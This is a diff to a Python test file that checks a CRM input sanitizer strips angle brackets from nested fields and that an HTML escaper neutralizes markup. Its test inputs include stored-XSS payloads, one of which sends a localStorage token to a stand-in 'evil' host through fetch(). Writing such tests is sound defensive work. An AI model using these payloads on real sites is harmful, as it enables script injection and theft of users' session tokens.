@@ -66,6 +66,20 @@ def test_url_safe_rejects_lookalike_host():
 
 
 # --------------------------------------------------------------------------- stored-XSS escaper
+def test_crm_sanitize_recurses_into_nested_fields():
+    # angle brackets must be stripped from EVERY string, incl. nested lists/dicts (PADR goals,
+    # claim/travel line-items) — a stored value can then never inject markup when re-rendered.
+    out = app.Handler._crm_sanitize({
+        "name": "<b>x</b>",
+        "goals": [{"objective": "<img src=x onerror=1>", "w": 5}],
+        "items": [{"desc": "a<script>b"}],
+    })
+    assert out["name"] == "bx/b"
+    assert out["goals"][0]["objective"] == "img src=x onerror=1", "nested list->dict->str must be cleaned"
+    assert out["items"][0]["desc"] == "ascriptb"
+    assert out["goals"][0]["w"] == 5, "non-string values must be preserved"
+
+
 def test_hesc_neutralizes_html():
     payload = '<img src=x onerror="fetch(\'evil?\'+localStorage.tk_token)">'
     out = app._hesc(payload)
